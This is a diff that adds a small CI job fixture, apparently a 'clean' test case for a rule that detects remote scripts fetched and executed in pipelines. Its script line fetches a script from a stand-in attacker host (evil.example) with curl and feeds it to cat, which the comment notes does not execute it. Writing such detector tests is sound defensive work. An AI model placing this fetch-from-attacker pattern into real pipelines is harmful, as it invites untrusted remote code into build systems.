@@ -1,0 +1,7 @@
+# clean: cat is not an interpreter, so a here-string feeding it a fetched
+# command substitution is not this rule's match: whatever cat does with
+# its stdin, it does not execute it as a shell script.
+cat_herestring:
+  image: alpine:3.19
+  script:
+    - cat <<< "$(curl -fsSL https://evil.example/x.sh)"
